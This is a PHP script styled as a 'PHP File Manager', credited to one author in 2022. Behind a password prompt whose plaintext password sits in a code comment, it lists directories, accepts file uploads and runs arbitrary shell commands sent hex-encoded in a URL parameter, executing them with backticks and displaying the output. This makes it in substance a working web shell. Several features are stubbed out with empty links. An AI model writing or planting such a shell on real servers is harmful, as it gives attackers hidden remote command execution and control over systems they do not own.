<?php
error_reporting(0);
session_start();

$password = '$2y$10$Mwr8zt5R50h8kMAfJiLrTuTMIo.jV9KRSi9P5vEttRgQ20mzMMDn2'; // ibra
function alert($pesan){
  echo "<script>alert('$pesan');</script>";
}

if(isset($_POST['password'])){

  $inputan  = $_POST['password'];

  if(password_verify($inputan, $password)){
    $_SESSION['login'] = true;
  }else{
    alert("Password salah!");
  }

}
?>

<?php
function writeable($path){
  $dir_writable = is_writable($path) ? 'true':'false';
  return $dir_writable;
}
function getukuran($path)
{
    $bytes = sprintf('%u', filesize($path));

    if ($bytes > 0)
    {
        $unit = intval(log($bytes, 1024));
        $units = array('B', 'KB', 'MB', 'GB');

        if (array_key_exists($unit, $units) === true)
        {
            return sprintf('%d %s', $bytes / pow(1024, $unit), $units[$unit]);
        }
    }

    return $bytes;
}
function getPermission($path){
  $perms = fileperms($path);

  switch ($perms & 0xF000) {
      case 0xC000: // socket
          $info = 's';
          break;
      case 0xA000: // symbolic link
          $info = 'l';
          break;
      case 0x8000: // regular
          $info = 'r';
          break;
      case 0x6000: // block special
          $info = 'b';
          break;
      case 0x4000: // directory
          $info = 'd';
          break;
      case 0x2000: // character special
          $info = 'c';
          break;
      case 0x1000: // FIFO pipe
          $info = 'p';
          break;
      default: // unknown
          $info = 'u';
  }

  // Owner
  $info .= (($perms & 0x0100) ? 'r' : '-');
  $info .= (($perms & 0x0080) ? 'w' : '-');
  $info .= (($perms & 0x0040) ?
              (($perms & 0x0800) ? 's' : 'x' ) :
              (($perms & 0x0800) ? 'S' : '-'));

  // Group
  $info .= (($perms & 0x0020) ? 'r' : '-');
  $info .= (($perms & 0x0010) ? 'w' : '-');
  $info .= (($perms & 0x0008) ?
              (($perms & 0x0400) ? 's' : 'x' ) :
              (($perms & 0x0400) ? 'S' : '-'));

  // World
  $info .= (($perms & 0x0004) ? 'r' : '-');
  $info .= (($perms & 0x0002) ? 'w' : '-');
  $info .= (($perms & 0x0001) ?
              (($perms & 0x0200) ? 't' : 'x' ) :
              (($perms & 0x0200) ? 'T' : '-'));

  return $info;
}
function icon($icon){
  echo "<i class='fa fa-$icon'></i>";
}
function redirect($lokasi){
  echo "<script>window.location='$lokasi';</script>";
}
function refresh(){
  echo "<script>window.location.reload()</script>";
}
function logout(){
  session_destroy();
  redirect(basename(__FILE__));  
}
if(isset($_SESSION['login'])){

  if(isset($_GET['path'])){
    $path = hex2bin($_GET['path']);
  }else{
    $path = getcwd();
  }

  if(isset($_GET['do'])){
    $do = $_GET['do'];
    if($do == bin2hex("logout")){
      logout();
    }
  }
?>
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>PHP File Manager</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/5.1.3/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdn.datatables.net/1.12.1/css/dataTables.bootstrap5.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css" integrity="sha512-KfkfwYDsLkIlwQp6LFnl8zNdLGxu9YAA1QvwINks4PhcElQSvqcyVLLD9aMhXd13uQjoXtEKNosOWaZqXgel0g==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-gH2yIJqKdNHPEq0n4Mqa/HGKIhSkIHeL5AyhkYV8i59U5AR6csBvApHHNl/vI1Bx" crossorigin="anonymous">
  </head>
  <body style="font-size:12px;">
    <div class="container">
      <div class="row justify-content-center">
        <div class="col-11">
          <div class="text-center mt-2">
            <a href="<?=$_SERVER['PHP_SELF']?>" class="nav-link"><h1>PHP File Manager</h1></a>
          </div>
          <div class="mt-2 float-right">
            <a href="?" class="btn btn-primary">
              <?=icon('home')?>
              Home
            </a>
            <a href="?do=<?=bin2hex('logout')?>" class="btn btn-danger">
              <?=icon('power-off')?>
              Logout
            </a>
          </div>
          <div class="mt-4">
            <div class="row">
              <div class="col-6">
                <form method="POST" enctype="multipart/form-data">
                <label for="file" class="form-label">Upload File</label>
                  <div class="mb-3 input-group">
                    <input type="file" name="file" class="form-control">
                    <button class="btn btn-primary">>></button>
                  </div>
                </form>
              </div>
              <div class="col">
                <form method="GET" action="">
                <label for="cmd" class="form-label">Execute Command</label>
                  <div class="mb-3 input-group">
                    <input type="text" name="<?=bin2hex('cmd')?>" class="form-control" placeholder="ls -la" id="cmd" autofocus>
                    <button class="btn btn-primary" onclick=encrypt()>>></button>
                  </div>
                </form>
              </div>
            </div>
          </div>
          <div>
            Current Path : <?php
            foreach(explode('/', $path) as $p){
            ?>
            <a href="?path=<?=$p?>"><?=$p?></a>/
            <?php
            }
            ?>
          </div>
          <script>
          function bin2hex (s) {
            // From: http://phpjs.org/functions
            // +   original by: Kevin van Zonneveld (http://kevin.vanzonneveld.net)
            // +   bugfixed by: Onno Marsman
            // +   bugfixed by: Linuxworld
            // +   improved by: ntoniazzi (http://phpjs.org/functions/bin2hex:361#comment_177616)
            // *     example 1: bin2hex('Kev');
            // *     returns 1: '4b6576'
            // *     example 2: bin2hex(String.fromCharCode(0x00));
            // *     returns 2: '00'

            var i, l, o = "", n;

            s += "";

            for (i = 0, l = s.length; i < l; i++) {
              n = s.charCodeAt(i).toString(16)
              o += n.length < 2 ? "0" + n : n;
            }

            return o;
          }
          function encrypt(){
            cmd = document.getElementById('cmd').value;
            document.getElementById('cmd').value = bin2hex(cmd);
          }</script>
          <?php
          if(isset($_GET[bin2hex('cmd')])){
            $cmd = hex2bin($_GET[bin2hex('cmd')]);
          ?>
          <div>
            <textarea class="form-control" rows="20" disabled style="resize:none; background-color: #0d6efd; color: white;font-size:13px;"><?=`$cmd`?></textarea>
          </div>
          <?php
          }else{
          ?>
          <div class="mt-2">
            <table id="example" class="table table-striped">
              <thead>
                <tr>
                  <th width="40%">Name</th>
                  <th>Type</th>
                  <th width="15%">Date</th>
                  <th width="10%">Size</th>
                  <th>Permission</th>
                  <th width="20%">Action</th>
                </tr>
              </thead>
              <tbody>
              <?php
                  $s = scandir($path);
                  foreach($s as $ss){
  
                    $xx = "$path/$ss";
                    
                    if($ss == "."){
                      continue;
                    }

                    if(is_file($xx)){continue;}
                    
                  ?>
                  <tr>
                    <td>
                      <a href="?path=<?=bin2hex($xx)?>" class="nav-link">
                        <?=$ss?>
                      </a>
                    </td>
                    <td>Dir</td>
                    <td><?=date ("d F Y H:i:s", filemtime($xx))?></td>
                    <td><?=getukuran($xx)?></td>
                    <td class="text-center"><?=(writeable($xx) == 'true') ? '<span class="text-success">'.getPermission($xx).'</span>':'<span class="text-danger">'.getPermission($xx).'</span>'?></td>
                    <td class="text-center">
                      <a class="btn btn-primary" href="?do=edit&file=&path=">
                      <?=icon('pencil')?>
                      </a>
                      <a class="btn btn-danger" href="?do=delete&file=&path=">
                      <?=icon('trash')?>
                      </a>
                    </td>
                  </tr>
                  <?php
                  }
                ?>
                <?php
                  $s = scandir($path);
                  foreach($s as $ss){
  
                    $xx = "$path/$ss";
                    
                    if($ss == "."){
                      continue;
                    }

                    if(is_dir($xx)){continue;}
                    
                  ?>
                  <tr>
                    <td>
                      <a href="?path=<?=$xx?>" class="nav-link">
                        <?=$ss?>
                      </a>
                    </td>
                    <td>File</td>
                    <td><?=date ("d F Y H:i:s", filemtime($xx))?></td>
                    <td><?=getukuran($xx)?></td>
                    <td class="text-center"><?=(writeable($xx) == 'true') ? '<span class="text-success">'.getPermission($xx).'</span>':'<span class="text-danger">'.getPermission($xx).'</span>'?></td>
                    <td class="text-center">
                      <a class="btn btn-primary" href="?do=edit&file=&path=">
                      <?=icon('pencil')?>
                      </a>
                      <a class="btn btn-secondary" href="?do=download&file=&path=">
                      <?=icon('download')?>
                      </a>
                      <a class="btn btn-danger" href="?do=delete&file=&path=">
                      <?=icon('trash')?>
                      </a>
                    </td>
                  </tr>
                  <?php
                  }
                ?>
                
              </tbody>
            </table>
          </div>
          <?php
          }
          ?>
          <div class="mt-5 text-center">
              <small>Muhammad Khidhir Ibrahim &copy; 2022</small>
          </div>
          <script src="https://code.jquery.com/jquery-3.5.1.js"></script>
          <script src="https://cdn.datatables.net/1.12.1/js/jquery.dataTables.min.js"></script>
          <script src="https://cdn.datatables.net/1.12.1/js/dataTables.bootstrap5.min.js"></script>
          <script>
          $(document).ready(function () {
              $('#example').DataTable("pageLength": 50);
          });</script>
          
          
        </div>
      </div>
    </div>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/js/bootstrap.bundle.min.js" integrity="sha384-A3rJD856KowSb7dwlZdYEkO39Gagi7vIsF0jrRAoQmDKKtQBHUuLZ9AsSv4jD4Xa" crossorigin="anonymous"></script>
  </body>
</html>
<?php
}else{
?>
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>PHP File Manager</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-gH2yIJqKdNHPEq0n4Mqa/HGKIhSkIHeL5AyhkYV8i59U5AR6csBvApHHNl/vI1Bx" crossorigin="anonymous">
  </head>
  <body>
    <div class="container">
      <div class="row mt-5 justify-content-center">
        <div class="col-lg-6 col-sm-12 mt-5">
          <div class="card mt-5">
            <div class="card-header text-center bg-secondary text-white">Login - PHP File Manager</div>
            <div class="card-body">
              <form method="POST">
                <div>
                  <input class="form-control" type="password" name="password" placeholder="Input password ..." autofocus>
                </div>
                <div class="mt-2 text-center">
                  <button class="btn btn-secondary">Login</button>
                </div>
              </form>
            </div>
          </div>
          <div class="mt-5 text-center">
              <small>Muhammad Khidhir Ibrahim &copy; 2022</small>
          </div>
        </div>
      </div>
    </div>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/js/bootstrap.bundle.min.js" integrity="sha384-A3rJD856KowSb7dwlZdYEkO39Gagi7vIsF0jrRAoQmDKKtQBHUuLZ9AsSv4jD4Xa" crossorigin="anonymous"></script>
  </body>
</html> 
<?php
die();
}
?>